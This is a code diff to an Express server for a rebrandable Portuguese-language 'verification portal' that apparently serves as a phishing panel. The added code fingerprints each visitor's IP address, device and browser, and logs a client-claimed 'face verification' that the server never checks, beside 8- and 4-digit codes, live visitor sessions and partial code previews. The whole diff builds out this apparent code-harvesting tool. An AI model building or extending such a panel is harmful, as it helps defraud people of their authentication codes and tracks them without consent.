@@ -29,6 +29,11 @@ interface FormConfig {
   brandName: string;
   logoUrl: string;
   authLoadingText: string;
+  enableFaceVerification: boolean;
+  faceTitle: string;
+  faceHelper: string;
+  faceSuccessTitle: string;
+  faceSuccessMessage: string;
   title: string;
   description: string;
   step1Title: string;
@@ -45,9 +50,20 @@ interface FormConfig {
   extraFields: ExtraFieldConfig[];
 }
 
+interface DeviceMetadata {
+  deviceType: string;
+  deviceBrand: string;
+  deviceModel: string;
+  os: string;
+  browser: string;
+}
+
 interface SubmissionRecord {
   id: string;
   protocol: string;
+  ipAddress?: string;
+  device?: DeviceMetadata;
+  faceVerified?: boolean;
   code8: string;
   code4: string;
   extraData: Record<string, string>;
@@ -73,6 +89,8 @@ interface StoreData {
 
 interface OnlineVisitor {
   sessionId: string;
+  ipAddress: string;
+  device: DeviceMetadata;
   step: string;
   code8Preview: string;
   lastSeen: number;
@@ -82,9 +100,15 @@ const DEFAULT_CONFIG: FormConfig = {
   brandName: 'Portal de Verificação',
   logoUrl: '',
   authLoadingText: 'Fazendo autenticação, aguarde...',
+  enableFaceVerification: true,
+  faceTitle: 'Verificação Facial',
+  faceHelper: 'Centralize seu rosto na moldura para realizar o escaneamento biométrico.',
+  faceSuccessTitle: 'Autenticação realizada e OK',
+  faceSuccessMessage:
+    'Sua verificação facial foi confirmada. Agora informe seu código de 8 dígitos.',
   title: 'Verificação de Acesso em Duas Etapas',
   description:
-    'Valide seu código principal de 8 dígitos e conclua a confirmação com o código de 4 dígitos.',
+    'Valide sua biometria facial, seu código principal de 8 dígitos e conclua com o código de 4 dígitos.',
   step1Title: 'Informe seu código de 8 dígitos',
   step1Helper: 'Digite ou cole os 8 números do seu código de identificação.',
   step1SuccessTitle: 'Verificado com sucesso',
@@ -335,7 +359,132 @@ function sanitizeExtraData(
   return result;
 }
 
+function extractClientIp(req: Request): string {
+  const candidates = [
+    req.headers['cf-connecting-ip'],
+    req.headers['x-forwarded-for'],
+    req.headers['x-real-ip'],
+    req.ip,
+    req.socket?.remoteAddress,
+  ];
+
+  for (const raw of candidates) {
+    const str = Array.isArray(raw) ? raw[0] : raw;
+    if (typeof str !== 'string' || !str.trim()) continue;
+    const first = str.split(',')[0].trim();
+    const cleaned = first.replace(/^::ffff:/i, '').slice(0, 64);
+    if (cleaned) return cleaned;
+  }
+  return 'IP indisponível';
+}
+
+function extractDeviceInfo(req: Request, rawHints?: unknown): DeviceMetadata {
+  const ua = typeof req.headers['user-agent'] === 'string' ? req.headers['user-agent'] : '';
+  const hints =
+    rawHints && typeof rawHints === 'object'
+      ? (rawHints as Record<string, unknown>)
+      : {};
+  const hintModel =
+    typeof hints.model === 'string' ? hints.model.trim().slice(0, 64) : '';
+  const hintPlatformVersion =
+    typeof hints.platformVersion === 'string'
+      ? hints.platformVersion.trim().slice(0, 24)
+      : '';
+
+  const isTablet = /iPad|Tablet|PlayBook|Silk|(Android(?!.*Mobile))/i.test(ua);
+  const isMobile = /Mobile|iPhone|iPod|Android.*Mobile|Windows Phone/i.test(ua);
+  const deviceType = isTablet ? 'Tablet' : isMobile ? 'Celular' : 'Computador';
+
+  // OS detection
+  let os = 'Desconhecido';
+  const androidMatch = /Android\s+([\d.]+)/i.exec(ua);
+  const iosMatch = /(?:iPhone|iPad|iPod).*?OS\s+([\d_]+)/i.exec(ua);
+  if (androidMatch) {
+    os = `Android ${androidMatch[1]}`;
+  } else if (iosMatch) {
+    os = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
+  } else if (/Windows NT 10\.0/i.test(ua)) {
+    const majorWin = Number(hintPlatformVersion.split('.')[0] ?? 0);
+    os = majorWin >= 13 ? 'Windows 11' : 'Windows 10/11';
+  } else if (/Windows NT/i.test(ua)) {
+    os = 'Windows';
+  } else if (/Mac OS X/i.test(ua)) {
+    os = 'macOS';
+  } else if (/CrOS/i.test(ua)) {
+    os = 'ChromeOS';
+  } else if (/Linux/i.test(ua)) {
+    os = 'Linux';
+  }
+
+  // Brand & Model detection
+  let deviceBrand = 'Desconhecido';
+  let deviceModel = hintModel;
+
+  if (/iPhone/i.test(ua)) {
+    deviceBrand = 'Apple';
+    deviceModel = deviceModel || 'iPhone';
+  } else if (/iPad/i.test(ua)) {
+    deviceBrand = 'Apple';
+    deviceModel = deviceModel || 'iPad';
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    deviceBrand = 'Apple';
+    deviceModel = deviceModel || 'Mac';
+  } else if (/SM-[A-Z0-9]+|Samsung|SAMSUNG/i.test(ua)) {
+    deviceBrand = 'Samsung';
+    const m = /(SM-[A-Z0-9]+)/i.exec(ua);
+    deviceModel = deviceModel || (m ? m[1].toUpperCase() : 'Galaxy');
+  } else if (/Redmi|POCO|Mi\s|Xiaomi|22\d{5}|23\d{5}|24\d{5}/i.test(ua)) {
+    deviceBrand = 'Xiaomi';
+    const m = /(Redmi[^;)]+|POCO[^;)]+|Mi\s[^;)]+)/i.exec(ua);
+    deviceModel = deviceModel || (m ? m[1].trim() : 'Xiaomi');
+  } else if (/Moto|Motorola|XT\d{4}/i.test(ua)) {
+    deviceBrand = 'Motorola';
+    const m = /(Moto[^;)]+|XT\d{4}[^;)]*)/i.exec(ua);
+    deviceModel = deviceModel || (m ? m[1].trim() : 'Moto');
+  } else if (/Pixel/i.test(ua)) {
+    deviceBrand = 'Google';
+    const m = /(Pixel[^;)]*)/i.exec(ua);
+    deviceModel = deviceModel || (m ? m[1].trim() : 'Pixel');
+  } else if (/HUAWEI|Honor/i.test(ua)) {
+    deviceBrand = /Honor/i.test(ua) ? 'Honor' : 'Huawei';
+  } else if (/Realme|RMX\d+/i.test(ua)) {
+    deviceBrand = 'Realme';
+  } else if (/OPPO|CPH\d+/i.test(ua)) {
+    deviceBrand = 'OPPO';
+  } else if (/ASUS|Zenfone|ROG/i.test(ua)) {
+    deviceBrand = 'Asus';
+  } else if (/LG-|LM-/i.test(ua)) {
+    deviceBrand = 'LG';
+  } else if (deviceType === 'Computador') {
+    deviceBrand = os.startsWith('Windows') ? 'PC Windows' : 'PC Linux';
+    deviceModel = deviceModel || 'Desktop';
+  } else if (hintModel) {
+    if (/^SM-/i.test(hintModel)) deviceBrand = 'Samsung';
+    else if (/^Pixel/i.test(hintModel)) deviceBrand = 'Google';
+    else if (/^Moto/i.test(hintModel)) deviceBrand = 'Motorola';
+    else if (/^Redmi|^POCO|^2\d{6}/i.test(hintModel)) deviceBrand = 'Xiaomi';
+  }
+
+  // Browser detection
+  let browser = 'Navegador';
+  if (/EdgA?|Edge/i.test(ua)) browser = 'Edge';
+  else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';
+  else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
+  else if (/Firefox|FxiOS/i.test(ua)) browser = 'Firefox';
+  else if (/Chrome|CriOS/i.test(ua)) browser = 'Chrome';
+  else if (/Safari/i.test(ua)) browser = 'Safari';
+
+  return {
+    deviceType,
+    deviceBrand,
+    deviceModel: deviceModel || deviceBrand,
+    os,
+    browser,
+  };
+}
+
 const app = express();
+app.set('trust proxy', true);
 app.use(express.json({ limit: '1mb' }));
 
 // Public Form Config
@@ -363,6 +512,8 @@ app.post('/api/presence', (req, res) => {
   if (sessionId) {
     onlineVisitors.set(sessionId, {
       sessionId,
+      ipAddress: extractClientIp(req),
+      device: extractDeviceInfo(req, req.body?.deviceHints),
       step,
       code8Preview,
       lastSeen: Date.now(),
@@ -374,6 +525,7 @@ app.post('/api/presence', (req, res) => {
 // Public Step 1 Verification (8 digits)
 app.post('/api/verify-step1', (req, res) => {
   const rawCode8 = typeof req.body?.code8 === 'string' ? req.body.code8 : '';
+  const faceVerified = Boolean(req.body?.faceVerified);
   const code8 = rawCode8.replace(/\D/g, '');
   if (!/^\d{8}$/.test(code8)) {
     res.status(400).json({ error: 'Informe exatamente 8 dígitos numéricos.' });
@@ -381,6 +533,8 @@ app.post('/api/verify-step1', (req, res) => {
   }
 
   const now = new Date().toISOString();
+  const ipAddress = extractClientIp(req);
+  const device = extractDeviceInfo(req, req.body?.deviceHints);
 
   if (store.config.validationMode === 'strict') {
     const matched = store.authorizedPairs.find(
@@ -390,6 +544,9 @@ app.post('/api/verify-step1', (req, res) => {
       const rejected: SubmissionRecord = {
         id: `sub-${crypto.randomUUID()}`,
         protocol: makeProtocol(),
+        ipAddress,
+        device,
+        faceVerified,
         code8,
         code4: '----',
         extraData: {},
@@ -412,6 +569,9 @@ app.post('/api/verify-step1', (req, res) => {
   const record: SubmissionRecord = {
     id: `sub-${crypto.randomUUID()}`,
     protocol: makeProtocol(),
+    ipAddress,
+    device,
+    faceVerified,
     code8,
     code4: '----',
     extraData: {},
@@ -435,6 +595,7 @@ app.post('/api/verify-step1', (req, res) => {
 app.post('/api/verify-step2', (req, res) => {
   const submissionId =
     typeof req.body?.submissionId === 'string' ? req.body.submissionId : '';
+  const faceVerified = Boolean(req.body?.faceVerified);
   const rawCode8 = typeof req.body?.code8 === 'string' ? req.body.code8 : '';
   const rawCode4 = typeof req.body?.code4 === 'string' ? req.body.code4 : '';
   const durationMs =
@@ -468,6 +629,8 @@ app.post('/api/verify-step2', (req, res) => {
     (s) => s.id === submissionId && s.code8 === code8
   );
   const now = new Date().toISOString();
+  const ipAddress = extractClientIp(req);
+  const device = extractDeviceInfo(req, req.body?.deviceHints);
 
   if (store.config.validationMode === 'strict') {
     const matched = store.authorizedPairs.find(
@@ -475,6 +638,9 @@ app.post('/api/verify-step2', (req, res) => {
     );
     if (!matched) {
       if (existing) {
+        existing.ipAddress = existing.ipAddress || ipAddress;
+        existing.device = existing.device || device;
+        existing.faceVerified = existing.faceVerified || faceVerified;
         existing.code4 = code4;
         existing.extraData = extraData;
         existing.status = 'Recusado';
@@ -485,6 +651,9 @@ app.post('/api/verify-step2', (req, res) => {
         store.submissions.unshift({
           id: `sub-${crypto.randomUUID()}`,
           protocol: makeProtocol(),
+          ipAddress,
+          device,
+          faceVerified,
           code8,
           code4,
           extraData,
@@ -505,6 +674,9 @@ app.post('/api/verify-step2', (req, res) => {
 
   let completed: SubmissionRecord;
   if (existing) {
+    existing.ipAddress = existing.ipAddress || ipAddress;
+    existing.device = existing.device || device;
+    existing.faceVerified = existing.faceVerified || faceVerified;
     existing.code4 = code4;
     existing.extraData = extraData;
     existing.status = 'Concluído';
@@ -516,6 +688,9 @@ app.post('/api/verify-step2', (req, res) => {
     completed = {
       id: `sub-${crypto.randomUUID()}`,
       protocol: makeProtocol(),
+      ipAddress,
+      device,
+      faceVerified,
       code8,
       code4,
       extraData,
@@ -630,6 +805,18 @@ app.put('/api/admin/config', requireAdmin, (req, res) => {
     brandName: str(incoming.brandName, store.config.brandName, 80),
     logoUrl: nextLogoUrl,
     authLoadingText: str(incoming.authLoadingText, store.config.authLoadingText, 120),
+    enableFaceVerification:
+      typeof incoming.enableFaceVerification === 'boolean'
+        ? incoming.enableFaceVerification
+        : store.config.enableFaceVerification,
+    faceTitle: str(incoming.faceTitle, store.config.faceTitle, 120),
+    faceHelper: str(incoming.faceHelper, store.config.faceHelper, 220),
+    faceSuccessTitle: str(incoming.faceSuccessTitle, store.config.faceSuccessTitle, 120),
+    faceSuccessMessage: str(
+      incoming.faceSuccessMessage,
+      store.config.faceSuccessMessage,
+      260
+    ),
     title: str(incoming.title, store.config.title, 120),
     description: str(incoming.description, store.config.description, 320),
     step1Title: str(incoming.step1Title, store.config.step1Title, 120),
